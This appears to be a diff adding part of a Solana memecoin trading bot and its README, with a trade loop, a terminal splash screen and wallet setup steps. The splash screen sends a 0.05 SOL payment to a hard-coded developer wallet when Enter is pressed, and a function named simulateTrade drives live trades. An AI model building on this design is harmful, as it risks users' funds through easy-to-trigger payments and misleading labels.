+                updateLog(`Transaction successful with hash: ${txHash}`);
+                await monitorTrade(mint, tokenInfo.marketcap, tokenInfo.bondingCurve);
+            }
+            setVisualMode('searching');
+        } else {
+            updateLog(`Bonding curve progress is ${MAX_BONDING_CURVE_PROGRESS}% or higher. Looking for newer tokens...`);
+        }
+    }
+};
+const main = async () => {
+    updateLog('Starting live trading mode...');
+    await updateAccountInfo(); // Display account info before starting the trade loop
+    setVisualMode('searching');
+    while (true) {
+        await simulateTrade();
+        updateLog('All pairs processed. Retrying in 5 seconds...');
+        await new Promise(resolve => setTimeout(resolve, 5000));
+    }
+};
+const liveUpdateAccountInfo = async () => {
+    while (true) {
+        await updateAccountInfo();
+        await new Promise(resolve => setTimeout(resolve, 10000)); // Update every 10 seconds
+    }
+};
+const calculateRentExemption = async (dataLength) => {
+    try {
+        const rentExemptionAmount = await connection.getMinimumBalanceForRentExemption(dataLength);
+        updateLog(`Rent exemption amount for ${dataLength} bytes: ${rentExemptionAmount / 1e9} SOL`);
+        return rentExemptionAmount;
+    } catch (error) {
+        updateLog(`Error calculating rent exemption: ${error.message}`);
+        return null;
+    }
+};
+const splashScreen = () => {
+    const splash = blessed.box({
+        parent: screen,
+        top: 'center',
+        left: 'center',
+        width: '80%',
+        height: '80%',
+        content: `
+Welcome to the Solana Trading Bot!
+This tool helps you trade tokens on the Solana blockchain based on bonding curves and market cap changes.
+Trading Strategy:
+- The bot scrapes data to identify new tokens with favorable bonding curves.
+- The bot monitors market cap changes and bonding curves to decide when to sell.
+- Goal is to take profit at a 25% increase, and again at another 25% increase.
+- Stop loss set if the market cap falls by 10% or if the bonding curve reaches a critical level.
+This uses Solana CLI to make trades. Must have Node, Selenium, Chrome WebDriver, and funded Solana wallet.
+Make sure to set Wallet JSON location and trading settings in .ENV file
+Requirements:
+- Node.js
+- Solana CLI
+- Selenium WebDriver (Chrome)
+Thank you for using this tool By Cliff Pierre CEO
+Solana donations are sent to HCkaYTj31n1rcffFUM5VZD5DTp2thL74tZvFp7i8rAok 
+Press Enter to support the developer with a 0.05 SOL donation. (Press C to continue without supporting the developer)
+        `,
+        border: {
+            type: 'line'
+        },
+        style: {
+            fg: 'white',
+            bg: 'blue',
+            border: {
+                fg: 'green'
+            },
+            hover: {
+                bg: 'green'
+            }
+        }
+    });
+    screen.append(splash);
+    screen.render();
+    screen.key(['enter', 'c'], async (ch, key) => {
+        if (key.name === 'enter') {
+            // Send developer fee
+            await sendDeveloperFee();
+        }
+        splash.destroy();
+        screen.render();
+        checkBalance().then(async (balance) => {
+            if (balance < MINIMUM_BUY_AMOUNT) {
+                updateLog('Insufficient balance to cover transaction and fees.');
+                process.exit(1);
+            } else {
+                const rentExemptionAmount = await calculateRentExemption(165);
+                if (rentExemptionAmount && balance < MINIMUM_BUY_AMOUNT + rentExemptionAmount / 1e9) {
+                    updateLog('Insufficient balance to cover rent exemption and transaction.');
+                    process.exit(1);
+                } else {
+                    main();
+                    liveUpdateAccountInfo(); // Start live update of account info
+                }
+            }
+        });
+    });
+};
+splashScreen();
+screen.key(['escape', 'q', 'C-c'], (ch, key) => process.exit(0));
+
+
+Requirements
+Node.js: JavaScript runtime built on Chrome V8 JavaScript engine.
+
+
+Solana CLI: Command-line interface for interacting with the Solana blockchain.
+
+
+Selenium WebDriver (Chrome): Automated web browser.
+
+
+Install dependencies: ```sh npm install dotenv axios @solana/web3.js @solana/spl-token selenium-webdriver fs bs58 blessed blessed-contrib ```
+
+
+Set up your environment variables: Create a .env file in the root directory and add the following:
+SOLANA_WALLET_PATH=/path/to/your/solana/wallet.json
+MINIMUM_BUY_AMOUNT=0.015
+MAX_BONDING_CURVE_PROGRESS=10
+SELL_BONDING_CURVE_PROGRESS=15
+
+
+Configure Solana CLI:
+```sh solana config set --url https://api.mainnet-beta.solana.com solana config set --keypair /path/to/your/solana/wallet.json ```
+
+
+Usage
+Run the trading bot:
+```sh node script.mjs ```  
+
+
+Sell all SPL tokens:
+```sh node sell.js ```
